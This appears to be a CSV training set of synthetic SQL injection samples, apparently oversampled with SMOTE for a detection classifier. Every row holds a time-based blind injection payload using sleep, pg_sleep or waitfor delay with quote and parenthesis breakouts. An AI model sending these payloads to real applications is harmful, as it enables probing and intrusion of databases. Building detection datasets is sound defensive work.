id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000049,0.9853269546104177
SMOTE_000002,attack,time,1%'   )    )    and sleep  (  5  )  #,nearest_attack_euclidean,R000123,0.7313094884415541
SMOTE_000003,attack,time,1  )   where 4600  =  4600 or sleep  (  5  )  --,nearest_attack_euclidean,R000155,0.3262288489251654
SMOTE_000004,attack,time,1' waitfor delay '0:0:5',nearest_attack_euclidean,R000234,0.3162961804641021
SMOTE_000005,attack,time,1  )   rlike sleep  (  5  )   and   (  5724  =  5724,nearest_attack_euclidean,R000129,0.16324061072398569
SMOTE_000006,attack,time,1%' rlike sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000251,0.850668327332338
SMOTE_000007,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R000099,0.5019010704077904
SMOTE_000008,attack,time,"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000199,0.8548198674509841
SMOTE_000009,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000015,1.9942687296053359
SMOTE_000010,attack,time,1%'   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000138,0.8807815403112801
SMOTE_000011,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000040,0.2377541384832071
SMOTE_000012,attack,time,"waitfor delay '0:0:5' and    (    (   ""ykgm""  =  ""ykgm",nearest_attack_euclidean,R000246,0.14974891988793923
SMOTE_000013,attack,time,1  )   waitfor delay '0:0:5' and   (  2993  =  2993,nearest_attack_euclidean,R000075,0.27740235477668895
SMOTE_000014,attack,time,1%' rlike sleep  (  5  )  #,nearest_attack_euclidean,R000089,0.18865347672393423
SMOTE_000015,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000132,0.3972832252286526
SMOTE_000016,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000083,0.03504217560786215
SMOTE_000017,attack,time,1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,nearest_attack_euclidean,R000161,0.7492826345632722
SMOTE_000018,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000037,0.8370405064187152
SMOTE_000019,attack,time,"1%"" rlike sleep  (  5  )  #",nearest_attack_euclidean,R000232,0.6738969749786893
SMOTE_000020,attack,time,1 and sleep  (  5  )  #,nearest_attack_euclidean,R000279,0.9261906783418994
SMOTE_000021,attack,time,1'   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000287,0.28304740496251296
SMOTE_000022,attack,time,1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,nearest_attack_euclidean,R000065,1.1607170088922771
SMOTE_000023,attack,time,1 rlike sleep  (  5  )  -- muhp,nearest_attack_euclidean,R000131,1.1788910871566016
SMOTE_000024,attack,time,"waitfor delay '0:0:5' and   (  ""dmcu""  =  ""dmcu",nearest_attack_euclidean,R000308,0.7174001687600035
SMOTE_000025,attack,time,1' where 9003  =  9003 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000264,0.06364131626554972
SMOTE_000026,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000018,1.43257639437014
SMOTE_000027,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R000240,1.082460053086069
SMOTE_000028,attack,time,"1%""   )    )     )   rlike sleep  (  5  )  #",nearest_attack_euclidean,R000237,1.109718086123398
SMOTE_000029,attack,time,select pg_sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000262,0.8290532337550598
SMOTE_000030,attack,time,"1""   )    )     )   rlike sleep  (  5  )  #",nearest_attack_euclidean,R000281,0.4847597996809114
SMOTE_000031,attack,time,1 where 7224  =  7224 and sleep  (  5  )  #,nearest_attack_euclidean,R000072,0.378749686165794
SMOTE_000032,attack,time,"1%"" waitfor delay '0:0:5' and ""%""  =  """,nearest_attack_euclidean,R000124,1.5068567409514269
SMOTE_000033,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000034,0.0864581798733887
SMOTE_000034,attack,time,1' where 6035  =  6035 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000236,1.022050741968651
SMOTE_000035,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000054,0.47317775995924494
SMOTE_000036,attack,time,1'   )    )     )   and sleep  (  5  )  #,nearest_attack_euclidean,R000078,0.1824706968164004
SMOTE_000037,attack,time,"1""  )   where 6821  =  6821 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000171,0.14618079819902124
SMOTE_000038,attack,time,1  )   and sleep  (  5  ) ,nearest_attack_euclidean,R000291,0.3944804754611869
